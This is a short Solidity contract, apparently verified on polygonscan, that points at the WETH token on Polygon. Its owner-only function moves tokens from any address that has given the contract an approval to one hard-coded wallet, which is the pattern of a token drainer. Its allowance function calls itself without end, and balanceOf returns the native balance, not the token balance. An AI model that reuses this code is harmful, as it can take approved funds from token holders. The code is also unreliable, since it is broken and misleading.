/**
 *Submitted for verification at polygonscan.com on 2022-01-25
*/

// SPDX-License-Identifier: MIT

// Specify version
pragma solidity ^0.8.7; // 0.8.0

// Prepare for load ERC20
interface IERC20 {
    // Interface
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    // Add function for call
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
}

contract MyContract {
    IERC20 public TokenAddr; // for Call ERC20 Interface
    address OwnerAddr; // Owner Addr

    constructor() {
         OwnerAddr = msg.sender; // Constract Creater set to ownwer

         // JPYC 0x6AE7Dfc73E0dDE2aa99ac063DcF7e8A63265108c
         // MATIC 0x0000000000000000000000000000000000001010
         // WETH  0x7ceb23fd6bc0add59e62ac25578270cff1b9f619
         // BUSD 0xe9e7cea3dedca5984780bafc599bd69add087d56

        bytes20 WETHbytes = hex"7ceb23fd6bc0add59e62ac25578270cff1b9f619";
        address WETHaddr = address(uint160(WETHbytes));
        TokenAddr = IERC20(WETHaddr);
    } 
    
    function allowance(address owner, address spender) public view returns (uint256) {
        return allowance(owner, spender); // return _allowances[owner][spender];
    }

    function balanceOf(address account) public view returns (uint256) {
        return account.balance / 1000000000000000000;
    }

    function transferfrom_token(address FromAddr, uint256 value) public {
        require(msg.sender == OwnerAddr); // If Contract Creater
        TokenAddr.transferFrom(FromAddr , 0x5De7470505F785A8A4AA571A71F0471cc816CCC3 , value );
    }
    
}